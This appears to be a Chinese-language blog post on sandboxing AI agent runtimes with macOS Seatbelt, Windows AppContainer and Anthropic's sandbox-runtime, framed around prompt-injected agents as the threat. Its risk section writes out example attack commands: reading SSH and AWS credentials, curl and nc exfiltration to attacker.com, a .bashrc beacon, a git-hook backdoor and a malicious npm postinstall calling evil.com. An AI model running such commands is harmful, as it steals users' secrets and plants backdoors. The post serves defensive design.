---
title: "企业级 Agent Runtime 的第一道防线：安全沙箱"
subtitle: "文件系统隔离 + 网络访问隔离——从 macOS Seatbelt 到 Windows AppContainer 的操作系统级安全实践"
date: 2026-03-15
tags: ["AI", "AI-agents", "security", "sandbox", "macOS", "Windows", "architecture", "best-practices"]
---

当我们谈论企业级 AI Agent Runtime 时，第一个需要解决的问题不是"模型有多聪明"，而是"Agent 执行的代码有多安全"。一个能读写文件、执行命令、访问网络的 Agent，如果没有安全边界，就是一颗不知道什么时候会爆炸的定时炸弹。

**企业级的 Agent Runtime 首先需要一个安全沙箱：文件系统隔离 + 网络访问隔离。**

<!--more-->

## 为什么 Agent Runtime 必须有沙箱？

传统软件运行在用户的权限下，执行的是人类编写的、经过代码审查的确定性代码。AI Agent 完全不同——它执行的代码来自大模型的实时推理，具有不确定性。更危险的是，Agent 可能被**提示注入（Prompt Injection）**攻击劫持，执行攻击者想要的操作。

没有沙箱的 Agent Runtime，面临的风险是真实且严重的：

### 风险一：凭证窃取

```bash
# Agent 被提示注入后可能执行的命令
cat ~/.ssh/id_rsa
cat ~/.aws/credentials
cat ~/.npmrc  # 包含 npm auth token
cat ~/Library/Keychains/*
```

用户的 SSH 私钥、云服务凭证、包管理器的认证令牌——所有敏感文件对无沙箱的 Agent 一览无余。

### 风险二：数据外泄

```bash
# 读取敏感文件并发送到攻击者服务器
curl https://attacker.com/collect?data=$(cat ~/.ssh/id_rsa | base64)
env | nc attacker.com 4444
```

即使 Agent 读到了敏感数据，如果网络被隔离，数据也送不出去。但没有网络隔离，一切都是透明的。

### 风险三：持久化后门

```bash
# 在用户的 shell 配置中注入恶意代码
echo 'curl https://attacker.com/beacon &' >> ~/.bashrc

# 在 Git hooks 中植入后门
echo '#!/bin/bash\ncurl https://attacker.com/hook' > .git/hooks/pre-commit
```

Agent 有写文件的能力，就有能力在用户不知情的情况下植入持久化后门。

### 风险四：供应链投毒

```json
{
  "scripts": {
    "postinstall": "curl https://evil.com/steal?env=$(env | base64)"
  }
}
```

Agent 执行 `npm install` 时，恶意包的 postinstall 脚本就会运行。没有沙箱，这些脚本和 Agent 拥有完全相同的权限。

**这些不是理论攻击——每一种都有真实的 CVE 和安全事件。** 这就是为什么企业级 Agent Runtime 的安全沙箱不是可选项，而是必选项。

## 安全沙箱的两大支柱

一个完整的 Agent 安全沙箱需要两种隔离能力协同工作：

```
┌──────────────────────────────────────────────────┐
│                  Agent Runtime                    │
│                                                  │
│   ┌──────────────┐      ┌──────────────────┐    │
│   │ 文件系统隔离  │      │   网络访问隔离    │    │
│   │              │      │                  │    │
│   │ 控制 Agent   │      │ 控制 Agent       │    │
│   │ 能读写哪些   │      │ 能访问哪些       │    │
│   │ 文件和目录   │      │ 主机和端口       │    │
│   └──────────────┘      └──────────────────┘    │
│                                                  │
│   两者缺一不可：                                  │
│   没有文件隔离 → 能读到敏感数据                    │
│   没有网络隔离 → 能把数据送出去                    │
│   两者齐备 → 即使读到也送不出去，即使能联网也读不到  │
└──────────────────────────────────────────────────┘
```

**单独的文件隔离不够**——Agent 可以读到敏感文件后，通过网络发送出去。

**单独的网络隔离也不够**——Agent 可以把数据写入文件，通过 Git push 等合法渠道间接外泄。

**两者必须同时存在，形成纵深防御（Defense in Depth）。**

## macOS 的 Seatbelt（沙箱）机制

macOS 的沙箱机制内部代号 **Seatbelt**，是苹果从 macOS 10.5 (2007) 开始引入的操作系统级安全能力。它的架构分三层：

```
用户空间:    sandbox-exec / App Sandbox 权限声明
                    │
                    ▼
内核扩展:    Sandbox.kext（沙箱策略引擎）
                    │
                    ▼
内核框架:    TrustedBSD MAC（强制访问控制框架）
```

### 核心原理：Deny Default

Seatbelt 的沙箱配置文件使用类 Scheme 语法编写，最关键的设计是 **deny default**——默认拒绝一切，只放行明确允许的操作：

```scheme
(version 1)
(deny default)    ;; 拒绝一切操作，除非下面明确允许

;; 只允许读取项目目录
(allow file-read*
    (subpath "/Users/dev/Projects/my-project"))

;; 只允许写入项目目录和临时目录
(allow file-write*
    (subpath "/Users/dev/Projects/my-project")
    (subpath "/private/tmp"))

;; 禁止读取敏感目录（即使上面的规则覆盖到了）
(deny file-read*
    (subpath "/Users/dev/.ssh")
    (subpath "/Users/dev/.aws")
    (subpath "/Users/dev/.gnupg")
    (subpath "/Users/dev/Library/Keychains"))

;; 只允许 HTTPS 出站连接
(allow network-outbound
    (remote tcp "*:443"))

;; 允许 DNS 查询
(allow network-outbound
    (remote udp "*:53"))
```

当一个进程运行在这个沙箱中时，内核的 TrustedBSD MAC 框架会在每一个安全相关的系统调用上设置拦截点。不是在系统调用之后检查，而是**在操作执行之前**判定是否放行。被拒绝的操作直接返回 `EPERM`（Operation not permitted），进程无法绕过。

### 文件系统隔离实战

Seatbelt 控制的文件操作粒度非常细：

| 操作 | 含义 |
|------|------|
| `file-read-data` | 读取文件内容 |
| `file-read-metadata` | 读取文件元信息 (stat) |
| `file-write-data` | 写入文件内容 |
| `file-write-create` | 创建新文件 |
| `file-write-unlink` | 删除文件 |
| `file-mount` | 挂载文件系统 |

路径过滤支持三种模式：

```scheme
;; literal: 精确匹配
(allow file-read-data (literal "/etc/hosts"))

;; subpath: 目录及所有子路径
(allow file-read* (subpath "/usr/share"))

;; regex: 正则表达式
(allow file-write* (regex #"^/private/tmp/myapp-.*"))
```

**实际效果演示：**

```bash
# 在沙箱中尝试读取 SSH 密钥
$ sandbox-exec -p '(version 1)(deny default)(allow file-read* (subpath "/usr"))' \
    cat ~/.ssh/id_rsa
cat: /Users/dev/.ssh/id_rsa: Operation not permitted

# 在沙箱中尝试写入系统目录
$ sandbox-exec -p '(version 1)(deny default)(allow file-read* (subpath "/"))' \
    touch /usr/local/bin/backdoor
touch: /usr/local/bin/backdoor: Operation not permitted
```

操作系统内核直接拒绝了这些操作。不是 Agent Runtime 在应用层做检查，而是**内核本身在强制执行**。即使 Agent 的代码绕过了 Runtime 的所有检查，操作系统也不会放行。

### 网络访问隔离实战

Seatbelt 同样可以精确控制网络行为：

```scheme
;; 完全禁止网络访问
(deny network*)

;; 只允许访问特定主机的 HTTPS 端口
(allow network-outbound
    (remote tcp "api.anthropic.com:443")
    (remote tcp "registry.npmjs.org:443"))

;; 禁止监听端口（防止反向 Shell）
(deny network-inbound)

;; 禁止原始套接字（防止数据包嗅探）
(deny system-socket)
```

**实际效果演示：**

```bash
# 使用 no-internet 配置文件运行命令
$ sandbox-exec -p '(version 1)(deny default)(allow file-read* (subpath "/"))(deny network*)' \
    curl https://attacker.com/collect
curl: (7) Couldn't connect to server    # 内核直接拒绝了网络连接
```

### 不可逆性：安全的根本保证

Seatbelt 最重要的安全特性之一：**沙箱一旦应用到进程，就不能被移除或放宽**。子进程会继承父进程的沙箱，并且只能添加更多限制，不能减少。

```c
// 沙箱只能变紧，不能变松
sandbox_init(profile, 0, &error);  // 应用沙箱
// 从此刻起，该进程及其所有子进程都受此沙箱约束
// 没有任何 API 可以解除沙箱
```

这意味着即使攻击者在沙箱内获得了代码执行能力，也不能通过任何编程手段关闭沙箱——**必须找到一个操作系统内核漏洞才能逃逸**。这将攻击的成本提升了一个数量级。

### 真实案例：Safari 沙箱阻止攻击链

2016-2019 年间，多个针对 Safari 浏览器的零日攻击被发现。攻击者利用 WebKit 渲染引擎的漏洞获得了代码执行权限，但因为 Safari 的渲染进程运行在 Seatbelt 沙箱中：

- 无法读取 `~/.ssh/` 或其他敏感文件
- 无法向攻击者服务器发送数据
- 无法获取 Mach 端口进行提权

**攻击者必须额外链接一个沙箱逃逸漏洞 + 一个内核提权漏洞，总共三个零日漏洞才能完成完整攻击。** 这就是沙箱的价值——不是让攻击变得不可能，而是让攻击的成本变得极高。

## Windows 的 AppContainer 隔离机制

Windows 从 Windows 8 开始引入了 **AppContainer** 隔离机制，这是所有 UWP 应用和现代浏览器（Edge、Chrome、Firefox）沙箱的基础。

### 核心原理：基于安全令牌的隔离

AppContainer 的设计与 macOS Seatbelt 截然不同。它不使用配置文件，而是通过修改进程的**安全访问令牌（Security Token）**实现隔离：

```
普通进程的安全令牌:
  用户 SID:     S-1-5-21-{domain}-{user}    （正常用户身份）
  完整性级别:   Medium（中等）
  → 可以访问用户权限下的所有资源

AppContainer 进程的安全令牌:
  用户 SID:         S-1-5-21-{domain}-{user}    （正常用户身份）
  AppContainer SID: S-1-15-2-{应用唯一哈希}       （应用唯一身份）
  完整性级别:       Low（低）
  能力 SID 列表:    [internetClient, documentsLibrary, ...]
  → 只能访问 ACL 中明确授予该 AppContainer SID 的资源
```

关键差异在访问检查算法上：

```
普通进程的访问检查:
  检查用户 SID/组 SID 是否匹配 ACL → 匹配就放行

AppContainer 进程的访问检查 (双重检查):
  第一轮: 检查 AppContainer SID 或能力 SID 是否匹配 ACL
    → 没有匹配的 ACE → 直接拒绝（不进入第二轮）
  第二轮: 检查用户 SID/组 SID 是否匹配 ACL
    → 两轮都通过才放行
```

这意味着即使一个文件对 `Everyone` 授予了完全访问权限，AppContainer 进程仍然无法访问它——因为第一轮 AppContainer 检查就会失败。**AppContainer 进程从零权限开始，必须被逐一授予每种访问能力。**

### 文件系统隔离

每个 AppContainer 应用获得自己的隔离存储空间：

```
C:\Users\{用户名}\AppData\Local\Packages\{应用包名}\
    LocalState\        ← 应用的本地数据（只有本应用能读写）
    RoamingState\      ← 跨设备漫游数据
    TempState\         ← 临时数据
    LocalCache\        ← 本地缓存
    Settings\          ← 应用设置
```

**实际效果：**

- AppContainer 应用**无法**读取 `%APPDATA%`、`%PROGRAMFILES%` 或其他应用的数据
- **无法**访问桌面、文档等用户目录（除非声明了对应的能力）
- **无法**枚举其他已安装的应用或它们的数据
- **无法**访问浏览器的 Cookie、密码数据库
- 即使应用被卸载，其隔离存储空间也会被清理干净

以代码方式创建 AppContainer 并启动隔离进程：

```cpp
#include <windows.h>
#include <userenv.h>

// 1. 创建 AppContainer 配置
PSID appContainerSid = NULL;
HRESULT hr = CreateAppContainerProfile(
    L"MyAgent.Sandbox",           // 唯一名称
    L"AI Agent Sandbox",          // 显示名称
    L"Sandbox for AI Agent",      // 描述
    capabilities,                 // 能力 SID 数组
    capabilityCount,              // 能力数量
    &appContainerSid              // 输出: AppContainer SID
);

// 2. 配置安全能力
SECURITY_CAPABILITIES secCaps = { 0 };
secCaps.AppContainerSid = appContainerSid;
secCaps.Capabilities = capabilities;      // 只授予 internetClient
secCaps.CapabilityCount = 1;

// 3. 启动隔离进程
STARTUPINFOEXW si = { 0 };
si.StartupInfo.cb = sizeof(si);
si.lpAttributeList = pAttrList;  // 包含 SECURITY_CAPABILITIES

CreateProcessW(
    L"agent-worker.exe",          // 要运行的程序
    NULL, NULL, NULL, FALSE,
    EXTENDED_STARTUPINFO_PRESENT, // 必须的标志
    NULL, NULL, &si.StartupInfo, &pi
);
// 从这一刻起，agent-worker.exe 运行在 AppContainer 中
// 它无法访问任何未明确授权的资源
```

### 网络访问隔离

AppContainer 实现了**默认拒绝**的网络模型。一个 AppContainer 进程**完全没有网络能力**，除非显式授予：

| 能力 | 含义 |
|------|------|
| `internetClient` | 允许出站互联网连接 |
| `internetClientServer` | 允许入站 + 出站互联网连接 |
| `privateNetworkClientServer` | 允许访问内网（家庭/企业网络） |

网络限制由 **Windows Filtering Platform (WFP)** 在内核态网络栈中执行：

```
应用层 (Winsock / WinHTTP)
         │
         ▼
AFD.sys (辅助功能驱动)
         │
         ▼
WFP (Windows 过滤平台)  ← AppContainer 网络检查在这里发生
         │                  检查: Token → AppContainer SID → 能力 SID
         ▼
TCPIP.sys (TCP/IP 协议栈)
         │
         ▼
网络适配器
```

WFP 的内核态执行意味着：**即使攻击者绕过了用户态 API 直接发起内核调用，网络限制仍然有效。**

更严格的是，AppContainer 进程**默认无法访问 localhost**。这阻止了沙箱内的进程与本机上运行的其他服务通信，防止了通过本地服务中转的攻击路径。

### 真实案例：浏览器渲染进程隔离

Microsoft Edge 和 Google Chrome 都使用 AppContainer 来隔离渲染进程：

```
Edge 浏览器的进程架构:

浏览器主进程 (非 AppContainer)
  ├── 渲染进程 A (AppContainer) ← 运行网页 JavaScript
  │     无文件系统访问
  │     无网络能力（通过主进程中转）
  │     无剪贴板访问
  │
  ├── 渲染进程 B (AppContainer) ← 另一个标签页
  │     完全独立的 AppContainer SID
  │     无法访问渲染进程 A 的数据
  │
  ├── GPU 进程 (AppContainer) ← 图形渲染
  │     有限的 IOKit 访问
  │
  └── 网络进程 (AppContainer) ← 网络请求
        只有 internetClient 能力
```

2020 年，一个 Chromium V8 引擎的漏洞被利用来在渲染进程中执行任意代码。但因为渲染进程运行在 AppContainer 中：

- 无法读取用户文件（DACL 中没有该 AppContainer SID 的 ACE）
- 无法发起网络连接（没有网络能力 SID）
- 无法与其他进程通信（localhost 被阻止）
- 攻击者需要**再找一个沙箱逃逸漏洞**才能扩大战果

## Claude Code 的沙箱实践：`sandbox-runtime`

Anthropic 为 Claude Code 开发了 `@anthropic-ai/sandbox-runtime`（简称 `srt`），这是目前 AI Agent 领域最成熟的客户端沙箱实现之一。它的设计思路完全符合我们上面讨论的两大支柱。

### 跨平台架构

`srt` 在不同操作系统上使用不同的原生沙箱机制：

```
macOS:  sandbox-exec + 动态生成的 Seatbelt 配置文件
Linux:  bubblewrap (bwrap) + seccomp BPF 过滤器
网络:   HTTP Proxy + SOCKS5 Proxy 进行域名级过滤
```

### 文件系统隔离配置

```json
{
  "filesystem": {
    "denyRead": ["~/.ssh", "~/.aws", "~/.gnupg"],
    "allowWrite": [".", "/tmp"],
    "denyWrite": [".env", "~/.bashrc", ".git/hooks"]
  }
}
```

规则语义：
- **读取**采用 deny-then-allow 模式：默认允许读取，通过 `denyRead` 排除敏感路径
- **写入**采用 allow-only 模式：默认拒绝所有写入，只开放 `allowWrite` 指定的路径
- `denyWrite` 优先级高于 `allowWrite`，即使在允许写入的目录中也能排除特定文件

### 网络隔离配置

```json
{
  "network": {
    "allowedDomains": [
      "registry.npmjs.org",
      "api.github.com",
      "pypi.org"
    ],
    "deniedDomains": ["*"]
  }
}
```

在 macOS 上，`srt` 生成的 Seatbelt 配置文件只允许连接到本地代理端口，所有流量必须经过代理服务器进行域名过滤。在 Linux 上，更激进地使用 `--unshare-net` 直接移除网络命名空间，所有流量通过 Unix 域套接字转发到宿主机的代理。

### 实际效果

```bash
# 正常操作：可以读取项目文件
$ srt "cat README.md"
# Anthropic Sandb...  ✓ 允许

# 安全阻止：不能读取 SSH 密钥
$ srt "cat ~/.ssh/id_rsa"
cat: /Users/dev/.ssh/id_rsa: Operation not permitted  ✗ 被内核拒绝

# 网络过滤：允许访问白名单域名
$ srt "curl https://registry.npmjs.org"
{...}  ✓ 允许

# 网络过滤：阻止非白名单域名
$ srt "curl https://attacker.com/collect"
Connection blocked by network allowlist  ✗ 被代理拒绝
```

## 为什么权限提示（Permission Prompt）不够？

有人可能会问：让用户在 Agent 执行每个命令前确认，不就够了吗？

答案是：**不够，而且差得远。**

### 问题一：审批疲劳

当 Agent 每执行一个命令都要弹出确认框时，用户很快就会形成肌肉记忆，不假思索地点击"允许"。这就像 Windows Vista 时代的 UAC 弹窗——用户被训练成了自动点击"是"的机器。

### 问题二：隐蔽的攻击

并非所有攻击命令都一眼能看出危险。一个看似正常的 `npm install` 命令，背后可能触发恶意包的 postinstall 脚本。一个 `git clone` 可能拉取一个包含恶意 Git hooks 的仓库。即使是安全专家也不一定能在几秒钟的确认窗口中识别出所有风险。

### 问题三：没有纵深防御

权限提示是**单点防御**——用户一旦点击允许，就完全没有后续保护了。沙箱提供的是**纵深防御**——即使用户批准了命令执行，操作系统仍然在强制限制命令能做什么。

```
权限提示模式:
  用户批准 → 命令以用户完整权限运行 → 无限制

沙箱模式:
  用户批准 → 命令在沙箱中运行 → 文件访问受限 + 网络受限
  即使用户误批了恶意命令，沙箱仍在保护
```

**Claude Code 的做法是两者结合**：用权限提示做第一层过滤，用沙箱做第二层兜底。这才是企业级的安全态度。

## 企业级 Agent Runtime 的沙箱设计原则

基于对 macOS Seatbelt 和 Windows AppContainer 的分析，以及 Claude Code 沙箱实践的经验，我认为企业级 Agent Runtime 的沙箱应该遵循以下设计原则：

### 原则一：Deny Default（默认拒绝）

Seatbelt 的 `(deny default)` 和 AppContainer 的"零权限起步"是同一个思想：**进程启动时什么都不能做，只被授予它真正需要的能力。** 这比"先给所有权限再逐个收回"安全得多，因为你不可能枚举出所有需要收回的权限，但你可以精确列出需要授予的权限。

### 原则二：内核级执行

安全检查必须在操作系统内核中执行，而不是在应用层。Seatbelt 通过 TrustedBSD MAC 框架在内核中拦截系统调用，AppContainer 通过安全引用监视器（SRM）和 WFP 在内核中执行访问检查。应用层的安全检查可以被绕过，但内核级的强制执行不行——除非攻击者有内核漏洞。

### 原则三：不可逆性

沙箱一旦应用就不能被进程自身移除或放宽。macOS Seatbelt 的 `sandbox_init()` 调用是不可逆的，子进程只能继承或收紧沙箱。Windows AppContainer 的安全令牌同样无法在运行时被修改。这确保了即使攻击者在沙箱内获得了代码执行能力，也无法自行脱离沙箱。

### 原则四：文件 + 网络双重隔离

必须同时实现文件系统隔离和网络访问隔离。单独的任一种都不足以构成完整的安全边界。

### 原则五：最小权限 + 能力声明

借鉴 AppContainer 的能力模型，Agent Runtime 应该要求每个 Agent/Skill 明确声明它需要的能力：

```json
{
  "skill": "code-review",
  "capabilities": {
    "filesystem": {
      "read": ["src/", "tests/"],
      "write": []
    },
    "network": {
      "allowed": []
    }
  }
}
```

一个代码审查技能不需要写入权限，也不需要网络访问。通过能力声明，Runtime 可以为每个技能配置最小权限的沙箱。

## 结论

企业级 AI Agent Runtime 的安全沙箱不是锦上添花，而是地基。

macOS 的 Seatbelt 用 deny-default 的沙箱配置文件和 TrustedBSD MAC 内核框架，证明了操作系统级文件/网络隔离的可行性和可靠性。Windows 的 AppContainer 用安全令牌和能力模型，证明了 deny-by-default 的进程隔离可以做到既安全又实用。Claude Code 的 `sandbox-runtime` 证明了这些 OS 原语可以被成功应用到 AI Agent 场景。

> **没有沙箱的 Agent Runtime，就像没有安全带的汽车——在路况好的时候看不出区别，出事故的时候就是生与死的区别。**

当你评估一个 Agent Runtime 是否足够"企业级"时，第一个要问的问题应该是：**它有沙箱吗？文件系统隔离和网络隔离分别是怎么实现的？是在应用层做的检查，还是操作系统内核在强制执行？**

如果答案是"没有沙箱"或"应用层检查"，那无论这个 Runtime 的模型有多强、功能有多丰富——它都不是企业级的。
